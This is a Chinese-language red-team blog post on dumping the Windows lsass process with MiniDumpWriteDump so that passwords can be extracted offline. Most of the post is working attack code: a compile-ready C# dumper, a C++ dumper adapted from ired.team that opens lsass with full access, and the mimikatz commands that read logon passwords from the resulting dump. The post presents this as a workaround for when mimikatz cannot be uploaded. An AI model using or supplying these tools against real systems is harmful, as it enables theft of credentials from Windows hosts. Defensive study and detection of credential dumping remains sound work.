---
layout:     post
title:    技巧-利用MiniDumpWriteDump 转储 lsass
subtitle:   利用MiniDumpWriteDump 转储 lsass
date:       2020-02-26
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 技巧
    - 红队
    
---
# 技巧-利用MiniDumpWriteDump 转储 lsass

## MiniDumpWriteDump
有些环境下可能无法上传或者利用mimikatz，可以转储lsass，然后本地离线用mimikatz读取密码。  
用来将指定进程的内存转储保存为文件，就是生成的文件有点大。  
函数：  
```
BOOL MiniDumpWriteDump(
  HANDLE                            hProcess,
  DWORD                             ProcessId,
  HANDLE                            hFile,
  MINIDUMP_TYPE                     DumpType,
  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);
```
具体可以看文档：[https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)  

## C#翻车版本
直接贴代码，直接编译就能用。但是有点问题。  
```
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;


namespace LsassDump
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+]Start Dump.........");
            MiniDump.TryDump("MiniDmp.dmp", MiniDump.MiniDumpType.WithFullMemory);
            Console.WriteLine("[+]OK");
            Console.ReadKey();
        }
    }


    public static class MiniDump
    {
        /*
         * 导入DbgHelp.dll
         */
       
        [DllImport("dbghelp.dll",
            EntryPoint = "MiniDumpWriteDump",
            CallingConvention = CallingConvention.Winapi,
            CharSet = CharSet.Unicode,
            ExactSpelling = true,
            SetLastError = true)]
        private static extern bool MiniDumpWriteDump(
                                    IntPtr hProcess,
                                    Int32 processId,
                                    IntPtr fileHandle,
                                    MiniDumpType dumpType,
                                    IntPtr expParam,
                                    IntPtr userStreamParam,
                                    IntPtr callbackParam);
     

        /*
         * 封装的一个函数
         */
        public static Boolean TryDump(String dmpPath, MiniDumpType dmpType)
        {

            //使用文件流来创健 .dmp文件
            using (FileStream stream = new FileStream(dmpPath, FileMode.Create))
            {
                //取得进程信息
                Process[] process = Process.GetProcessesByName("lsass");
                Console.WriteLine("[+]Process ID:" + process[0].Id);
      

                //调用Win32API
                Boolean res = MiniDumpWriteDump(
                                    process[0].Handle,
                                    process[0].Id,
                                    stream.SafeFileHandle.DangerousGetHandle(),
                                    dmpType,
                                    IntPtr.Zero,
                                    IntPtr.Zero,
                                    IntPtr.Zero);

                //清空 stream
                stream.Flush();
                stream.Close();

                return res;   
            }
        }

        public enum MiniDumpType
        {
            None = 0x00010000,
            Normal = 0x00000000,
            WithDataSegs = 0x00000001,
            WithFullMemory = 0x00000002,
            WithHandleData = 0x00000004,
            FilterMemory = 0x00000008,
            ScanMemory = 0x00000010,
            WithUnloadedModules = 0x00000020,
            WithIndirectlyReferencedMemory = 0x00000040,
            FilterModulePaths = 0x00000080,
            WithProcessThreadData = 0x00000100,
            WithPrivateReadWriteMemory = 0x00000200,
            WithoutOptionalData = 0x00000400,
            WithFullMemoryInfo = 0x00000800,
            WithThreadInfo = 0x00001000,
            WithCodeSegs = 0x00002000
        }
    }
}
```
win10下测试没有问题，但是跑到win7上不管什么用户去执行都不行，会抛出内存访问被拒绝的异常，导个win10也没啥用，就图一乐？  
![200226_1](/im/200226_dumperror.png)  

## C++版本
参考了这里的代码：[https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass)  
```
#include "stdafx.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
using namespace std;

int main() {
	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL; 
	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";

	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
	}
	
	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	
	if (isDumped) {
		cout << "[+] lsass dumped successfully!" << endl;
	}
	
    return 0;
}
```
编译出来。   
在win10没有问题，在win7下测试也没有问题，管理员权限运行能正常导出。  
![200226_2](/img/200226_dumpok.png)  
再用mimikatz测试：  
```
sekurlsa::minidump MiniDmp.dmp
sekurlsa::logonpasswords
```
![200226_3](/img/200226_mimikatz.png)  


  
